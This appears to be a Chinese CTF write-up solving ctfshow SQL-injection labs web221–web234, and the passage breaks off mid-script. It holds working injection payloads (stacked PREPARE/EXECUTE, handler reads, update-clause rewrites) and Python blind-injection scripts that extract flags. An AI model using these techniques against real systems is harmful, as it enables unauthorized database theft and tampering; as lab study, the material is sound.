@@ -1,0 +1,592 @@
+<div class="article_content clearfix" id="article_content">
+<link href="style.css" rel="stylesheet"/>
+<div class="markdown_views prism-dracula" id="content_views">
+<svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
+<path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
+</svg>
+<pre><code>`
+</code></pre>
+<p></p>
+<div class="toc">
+<h3>目录</h3>
+<ul><li><a href="#_5">前言</a></li><li><a href="#_14">题目</a></li><li><ul><li><a href="#web221limit_16">web221(limit注入)</a></li><li><a href="#web222group_by_39">web222(group by注入)</a></li><li><a href="#web223group_by_72">web223(group by注入)</a></li><li><a href="#web224_121">web224(文件名注入)</a></li><li><a href="#web225__133">web225 (堆叠注入)</a></li><li><ul><li><a href="#handle_143">解法一(handle)</a></li><li><a href="#_152">解法二(预编译)</a></li></ul>
+</li><li><a href="#web226web228web230__166">web226,web228-web230 (堆叠注入)</a></li><li><a href="#web227__201">web227 (堆叠注入)</a></li><li><a href="#web231_update_224">web231 (update注入)</a></li><li><ul><li><a href="#1_232">解法1</a></li><li><a href="#2_260">解法2</a></li></ul>
+</li><li><a href="#web232update_313">web232(update注入)</a></li><li><a href="#web233update_321">web233(update注入)</a></li><li><a href="#web234update_370">web234(update注入)</a></li><li><a href="#web235update_440">web235(update注入)</a></li><li><ul><li><a href="#union_452">union重命名法</a></li><li><a href="#_466">比较法盲注</a></li></ul>
+</li><li><a href="#web236update_514">web236(update注入)</a></li><li><ul><li><a href="#_518">比较法盲注</a></li><li><a href="#union_522">union重命名法</a></li></ul>
+</li><li><a href="#web237insert_536">web237(insert注入)</a></li><li><a href="#web238insert_556">web238(insert过滤)</a></li><li><a href="#web239insert_569">web239(insert过滤)</a></li><li><a href="#web240insert_586">web240(insert过滤)</a></li><li><a href="#web241delete_604">web241(delete注入)</a></li><li><a href="#web242_669">web242(文件读写)</a></li></ul>
+</li><li><a href="#_730">题解</a></li><li><a href="#_735">总结</a></li></ul>
+</div>
+<p></p>
+<hr color="#000000" size='1"'/>
+<h1><a id="_5"></a>前言</h1>
+<p>开始下半部分</p>
+<hr color="#000000" size='1"'/>
+<h1><a id="_14"></a>题目</h1>
+<h2><a id="web221limit_16"></a>web221(limit注入)</h2>
+<p>做之前,可以先看一下p神的博客,有讲关于limit注入的,版本限制(5.0.0-5.6.6)</p>
+<blockquote>
+<p><a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html</a></p>
+</blockquote>
+<p>补充以下:</p>
+<p>这里分两种情况,limit前面有无order by,有order by可以用union联合查询的</p>
+<pre><code class="prism language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">LIMIT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span>
+</code></pre>
+<p><img alt="20220411131449" src="https://img-blog.csdnimg.cn/img_convert/dfda635af88db18e866b438ae0c93599.png"/><br/> 题目用不了union,说明有order by</p>
+<p>直接用p神的payload,数据库名就是flag</p>
+<pre><code class="prism language-sql"><span class="token keyword">procedure</span> analyse<span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
+</code></pre>
+<p>因为版本问题,select用不了,所以也不能查到更多信息</p>
+<h2><a id="web222group_by_39"></a>web222(group by注入)</h2>
+<p>看到有个去重,点击抓包</p>
+<p>初步判断一下,可以用<code>concat(if(1=1,"username",cot(0)))</code>,根据回显直接用盲注<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/954a6bbb75904545a0318c3741d1b637.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAS3JhZHJlc3M=,size_20,color_FFFFFF,t_70,g_se,x_16"/></p>
+<pre><code class="prism language-py"><span class="token comment"># @Author:Kradress</span>
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> string
+
+url <span class="token operator">=</span> <span class="token string">"http://12ee4415-b331-421c-b9d4-a077a8e155fd.challenge.ctf.show/api/"</span>
+
+result <span class="token operator">=</span> <span class="token string">''</span>
+<span class="token builtin">dict</span><span class="token operator">=</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span>string<span class="token punctuation">.</span>digits<span class="token operator">+</span><span class="token string">"_-}{"</span>
+
+<span class="token comment"># 爆表名  </span>
+<span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
+<span class="token comment"># 爆列名</span>
+<span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flaga'"</span>
+<span class="token comment">#爆字段值</span>
+payload <span class="token operator">=</span> <span class="token string">"select flagaabc from ctfshow_flaga"</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>
+        s <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"?u=concat(if(substr((</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>payload<span class="token punctuation">}</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>i<span class="token punctuation">}</span></span><span class="token string">,1)='</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>j<span class="token punctuation">}</span></span><span class="token string">',username,cot(0)))#"</span></span>
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>s<span class="token punctuation">)</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"ctfshow"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            result <span class="token operator">+=</span>j
+            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+</code></pre>
+<h2><a id="web223group_by_72"></a>web223(group by注入)</h2>
+<p>对数字进行了过滤</p>
+<pre><code class="prism language-py"><span class="token comment"># @Author:Kradress</span>
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> string
+
+url <span class="token operator">=</span> <span class="token string">"http://7702b56c-35d9-4b80-abdc-bb0956f4bce5.challenge.ctf.show/api/"</span>
+
+result <span class="token operator">=</span> <span class="token string">''</span>
+<span class="token builtin">dict</span><span class="token operator">=</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span>string<span class="token punctuation">.</span>digits<span class="token operator">+</span><span class="token string">"_-,}{"</span>
+
+<span class="token comment"># 爆表名  </span>
+<span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
+<span class="token comment"># 爆列名</span>
+<span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flagas'"</span>
+<span class="token comment">#爆字段值</span>
+payload <span class="token operator">=</span> <span class="token string">"select flagasabc from ctfshow_flagas"</span>
+
+<span class="token keyword">def</span> <span class="token function">numToStr</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    parts <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> s <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
+        parts<span class="token punctuation">.</span>append<span class="token punctuation">(</span>numToStr2<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    res <span class="token operator">=</span> <span class="token string">','</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>parts<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"concat(</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>res<span class="token punctuation">}</span></span><span class="token string">)"</span></span>
+
+<span class="token keyword">def</span> <span class="token function">numToStr2</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    parts <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    n <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        parts<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"true"</span><span class="token punctuation">)</span>
+    res <span class="token operator">=</span> <span class="token string">"+"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>parts<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"char(</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>res<span class="token punctuation">}</span></span><span class="token string">)"</span></span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>
+        params<span class="token operator">=</span><span class="token punctuation">{<!-- --></span>
+            <span class="token string">'u'</span> <span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"concat(if(substr((</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>payload<span class="token punctuation">}</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>numToStr<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">,true)=</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>numToStr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">,username,cot(false)))#"</span></span>
+        <span class="token punctuation">}</span>
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span>
+        <span class="token comment"># print(r.url)</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"ctfshow"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            result <span class="token operator">+=</span>j
+            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+</code></pre>
+<h2><a id="web224_121"></a>web224(文件名注入)</h2>
+<p>登陆页面试了半天进不去,后面发现有个robot.txt,里面有个重置密码页面</p>
+<p>成功进了后台,发现是一个文件上传点,但经过测试,只能上传zip</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/9a1e5245e71c4247a73f486bb677a07e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAS3JhZHJlc3M=,size_20,color_FFFFFF,t_70,g_se,x_16"/></p>
+<p>没什么思路,群里有个payload.bin可以上传,访问1.php可以getshell<br/> (y1ng师傅也有详细讲解)</p>
+<p><a href="https://blog.gem-love.com/ctf/2283.html#%E4%BD%A0%E6%B2%A1%E8%A7%81%E8%BF%87%E7%9A%84%E6%B3%A8%E5%85%A5">https://blog.gem-love.com/ctf/2283.html#%E4%BD%A0%E6%B2%A1%E8%A7%81%E8%BF%87%E7%9A%84%E6%B3%A8%E5%85%A5</a></p>
+<h2><a id="web225__133"></a>web225 (堆叠注入)</h2>
+<pre><code class="prism language-php">  <span class="token comment">//师傅说过滤的越多越好</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i'</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+</code></pre>
+<p>看上去过滤挺多的,不过可以用handlie</p>
+<h3><a id="handle_143"></a>解法一(handle)</h3>
+<pre><code>?username=';show tables;%23
+
+?username=';handler `ctfshow_flagasa` open as hd;handler hd read first;%23
+
+</code></pre>
+<h3><a id="_152"></a>解法二(预编译)</h3>
+<blockquote>
+<p>prepare用于预备一个语句，并赋予名称，以后可以引用该语句<br/> execute执行语句<br/> (deallocate|drop) prepare name用来释放掉预处理的语句(也可以不加)</p>
+</blockquote>
+<pre><code class="prism language-sql"><span class="token keyword">Prepare</span> stmt <span class="token keyword">from</span> CONCAT<span class="token punctuation">(</span><span class="token string">'se'</span><span class="token punctuation">,</span><span class="token string">'lect * from `ctfshow_flagasa`;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">EXECUTE</span> stmt<span class="token punctuation">;</span><span class="token comment">#</span>
+拆分开来如下：
+<span class="token keyword">Prepare</span> stmt <span class="token keyword">from</span> CONCAT<span class="token punctuation">(</span><span class="token string">'se'</span><span class="token punctuation">,</span><span class="token string">'lect * from `ctfshow_flagasa`;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">EXECUTE</span> stmt<span class="token punctuation">;</span>
+<span class="token comment">#deallocate prepare stmt; #可以不加</span>
+<span class="token comment">#</span>
+</code></pre>
+<h2><a id="web226web228web230__166"></a>web226,web228-web230 (堆叠注入)</h2>
+<pre><code class="prism language-php">  <span class="token comment">//师傅说过滤的越多越好</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(/i'</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+</code></pre>
+<p>对比上题,show不能用了意味着不能通过<code>show tables</code>来获取表名</p>
+<p>采用预编译的话因为<code>(</code>,不能用,concat用不了了,不过可以使用16进制代替,如果只是过滤引号的话可以用unhex()和hex()组合绕过,这里分享一下</p>
+<pre><code>'abc' 等价于unhex(hex(6e6+382179)); 可以用于绕过大数过滤（大数过滤：/\d{9}|0x[0-9a-f]{9}/i）
+具体转换的步骤是：
+  1. abc转成16进制是616263
+  2. 616263转十进制是6382179
+  3. 用科学计数法表示6e6+382179 
+  4. 套上unhex(hex())，就是unhex(hex(6e6+382179));
+</code></pre>
+<p>回到正题</p>
+<p>查表名(也不用加注释<code>;</code>就相当于结束了sql语句了)</p>
+<pre><code class="prism language-sql">?username<span class="token operator">=</span>'<span class="token punctuation">;</span><span class="token keyword">Prepare</span> stmt <span class="token keyword">from</span> <span class="token number">0x73686F77207461626C6573</span><span class="token punctuation">;</span><span class="token keyword">EXECUTE</span> stmt<span class="token punctuation">;</span>
+</code></pre>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/b728f227429d463490c44f1b6e3d6589.png"/><br/> 拿到flag</p>
+<pre><code class="prism language-sql">?username<span class="token operator">=</span>'<span class="token punctuation">;</span><span class="token keyword">Prepare</span> stmt <span class="token keyword">from</span> <span class="token number">0x73656C656374202A2066726F6D2063746673685F6F775F666C61676173</span><span class="token punctuation">;</span><span class="token keyword">EXECUTE</span> stmt<span class="token punctuation">;</span>
+</code></pre>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/ffaa1a0f99a34d309505eea909681d60.png"/></p>
+<h2><a id="web227__201"></a>web227 (堆叠注入)</h2>
+<p>和上题差不多思路,但是找不到flag</p>
+<pre><code> //师傅说过滤的越多越好
+  if(preg_match('/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|db|\,/i',$username)){
+    die(json_encode($ret));
+  }
+</code></pre>
+<p>参考博客<a href="https://blog.csdn.net/qq_41573234/article/details/80411079">MySQL——查看存储过程和函数</a><br/> 在 MySQL 中，存储过程和函数的信息存储在 information_schema 数据库下的 Routines 表中，可以通过查询该表的记录来查询存储过程和函数的信息，其基本的语法形式如下:</p>
+<pre><code class="prism language-sql">   <span class="token keyword">SELECT</span>   <span class="token operator">*</span>   <span class="token keyword">FROM</span>   information_schema<span class="token punctuation">.</span>Routines
+   <span class="token keyword">WHERE</span>   ROUTINE_NAME  <span class="token operator">=</span>  <span class="token string">'   sp_name  '</span> <span class="token punctuation">;</span>
+</code></pre>
+<p>其中，ROUTINE_NAME 字段中存储的是存储过程和函数的名称; sp_name 参数表示存储过程或函数的名称。</p>
+<p>直接拿到flag</p>
+<pre><code class="prism language-sql">?username<span class="token operator">=</span>'<span class="token punctuation">;</span><span class="token keyword">Prepare</span> stmt <span class="token keyword">from</span> <span class="token number">0x73656C656374202A2066726F6D20696E666F726D6174696F6E5F736368656D612E726F7574696E6573</span><span class="token punctuation">;</span><span class="token keyword">EXECUTE</span> stmt<span class="token punctuation">;</span><span class="token operator">%</span>
+</code></pre>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/3589401af2284ac5b34e4b51053f47ff.png"/></p>
+<h2><a id="web231_update_224"></a>web231 (update注入)</h2>
+<p>先来看看sql语句</p>
+<pre><code class="prism language-php">  <span class="token comment">//分页查询</span>
+ <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"update ctfshow_user set pass = '<span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$password</span><span class="token punctuation">}</span></span>' where username = '<span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$username</span><span class="token punctuation">}</span></span>';"</span><span class="token punctuation">;</span>
+</code></pre>
+<p>题目本身是没有什么过滤的,有两个可以注入的地方</p>
+<h3><a id="1_232"></a>解法1</h3>
+<p>把在<code>pass</code>处把密码闭合,把<code>username</code>值改为<code>datebase()</code>,然后注释掉后面</p>
+<pre><code>password=123',username=database()#&amp;username=
+</code></pre>
+<p>把所有用户名密码改成了数据库名</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/02dba2014de548fe973149e0fee250c7.png"/><br/> 查表名</p>
+<pre><code>// banlist,ctfshow_user,flaga
+password=123',username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#&amp;username=
+</code></pre>
+<p>查字段名</p>
+<pre><code>//id,flagas,info
+password=123',username=(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flaga')#&amp;username=
+</code></pre>
+<p>拿flag</p>
+<pre><code>password=123',username=(select group_concat(flagas) from flaga)#&amp;username=
+</code></pre>
+<h3><a id="2_260"></a>解法2</h3>
+<p>延时3s,直接上时间盲注脚本</p>
+<pre><code>password=123&amp;username=ctfshow' and sleep(3)#
+</code></pre>
+<pre><code class="prism language-py"><span class="token comment"># @Author:Kradress</span>
+<span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"http://f50fecf3-250b-45f2-9c10-ada03b956fff.challenge.ctf.show/api/"</span>
+table_name <span class="token operator">=</span> <span class="token string">'flaga'</span>
+flag <span class="token operator">=</span> <span class="token string">'flagas'</span>
+
+result <span class="token operator">=</span> <span class="token string">''</span>
+
+<span class="token comment"># 数据库名</span>
+<span class="token comment"># payload = "database()"</span>
+<span class="token comment"># 爆表名  </span>
+<span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
+<span class="token comment"># 爆列名</span>
+<span class="token comment"># payload = f"select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='{table_name}'"</span>
+<span class="token comment">#爆字段值</span>
+payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"select </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>flag<span class="token punctuation">}</span></span><span class="token string"> from </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>table_name<span class="token punctuation">}</span></span><span class="token string">"</span></span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    head <span class="token operator">=</span> <span class="token number">32</span>
+    tail <span class="token operator">=</span> <span class="token number">127</span>
+
+    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
+
+        <span class="token comment">#sleep(1)</span>
+        
+        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span> <span class="token comment"># 中间指针等于头尾指针相加的一半</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
+        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
+            <span class="token string">'username'</span> <span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"ctfshow' and if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>payload<span class="token punctuation">}</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>i<span class="token punctuation">}</span></span><span class="token string">,1))&gt;</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>mid<span class="token punctuation">}</span></span><span class="token string">,sleep(3),1)#"</span></span><span class="token punctuation">,</span>
+            <span class="token string">'password'</span> <span class="token punctuation">:</span> <span class="token number">0</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">2.5</span><span class="token punctuation">)</span>
+            tail <span class="token operator">=</span> mid 
+        <span class="token keyword">except</span><span class="token punctuation">:</span>
+            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span> <span class="token comment">#sleep导致超时</span>
+
+    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
+        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">break</span>
+</code></pre>
+<h2><a id="web232update_313"></a>web232(update注入)</h2>
+<pre><code class="prism language-php"> <span class="token comment">//分页查询</span>
+  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"update ctfshow_user set pass = md5('<span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$password</span><span class="token punctuation">}</span></span>') where username = '<span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$username</span><span class="token punctuation">}</span></span>';"</span><span class="token punctuation">;</span>
+</code></pre>
+<p>密码用md5加密了了,可以通过拼接<code>')</code>来闭合,其他和上题一样</p>
+<h2><a id="web233update_321"></a>web233(update注入)</h2>
+<p>这题直接用盲注</p>
+<pre><code class="prism language-py"><span class="token comment"># @Author:Kradress</span>
+<span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"http://0dafac0b-7752-47bd-83fe-b65c972164e9.challenge.ctf.show/api/"</span>
+table_name <span class="token operator">=</span> <span class="token string">'flag233333'</span>
+flag <span class="token operator">=</span> <span class="token string">'flagass233'</span>
+
+result <span class="token operator">=</span> <span class="token string">''</span>
+
+<span class="token comment"># 数据库名</span>
+<span class="token comment"># payload = "database()"</span>
+<span class="token comment"># 爆表名  </span>
+<span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
+<span class="token comment"># 爆列名</span>
+<span class="token comment"># payload = f"select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='{table_name}'"</span>
+<span class="token comment">#爆字段值</span>
+payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"select </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>flag<span class="token punctuation">}</span></span><span class="token string"> from </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>table_name<span class="token punctuation">}</span></span><span class="token string">"</span></span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    head <span class="token operator">=</span> <span class="token number">32</span>
+    tail <span class="token operator">=</span> <span class="token number">127</span>
+
+    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
+
+        <span class="token comment">#sleep(1)</span>
+        
+        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span> <span class="token comment"># 中间指针等于头尾指针相加的一半</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
+        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
+            <span class="token string">'username'</span> <span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"ctfshow' and if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>payload<span class="token punctuation">}</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>i<span class="token punctuation">}</span></span><span class="token string">,1))&gt;</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>mid<span class="token punctuation">}</span></span><span class="token string">,sleep(3),1)#"</span></span><span class="token punctuation">,</span>
+            <span class="token string">'password'</span> <span class="token punctuation">:</span> <span class="token number">0</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">2.5</span><span class="token punctuation">)</span>
+            tail <span class="token operator">=</span> mid 
+        <span class="token keyword">except</span><span class="token punctuation">:</span>
+            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span> <span class="token comment">#sleep导致超时</span>
+
+    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
+        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">break</span>
+</code></pre>
+<h2><a id="web234update_370"></a>web234(update注入)</h2>
+<p>尝试下了,执行失败,猜测可能单引号被过滤了</p>
+<pre><code>password=1234&amp;username=ctfshow'#
+</code></pre>
+<p>可以在<code>pass</code>处用<code>\</code>转义单引号,<code>username</code>用十六进制绕过</p>
+<pre><code>//0x63746673686f77 =&gt; ctfshow
+password=\&amp;username= where username =  0x63746673686f77 and sleep(3)#
+</code></pre>
+<p>最后直接上盲注脚本</p>
+<pre><code class="prism language-py"><span class="token comment"># @Author:Kradress</span>
+<span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"http://9298293f-de8c-414f-beaf-5ef7041922f2.challenge.ctf.show/api/"</span>
+table_name <span class="token operator">=</span> <span class="token string">'flag23a'</span>
+flag <span class="token operator">=</span> <span class="token string">'flagass23s3'</span>
+
+result <span class="token operator">=</span> <span class="token string">''</span>
+
+<span class="token keyword">def</span> <span class="token function">strToHex</span><span class="token punctuation">(</span>S <span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    parts <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> s <span class="token keyword">in</span> S<span class="token punctuation">:</span>
+        parts<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
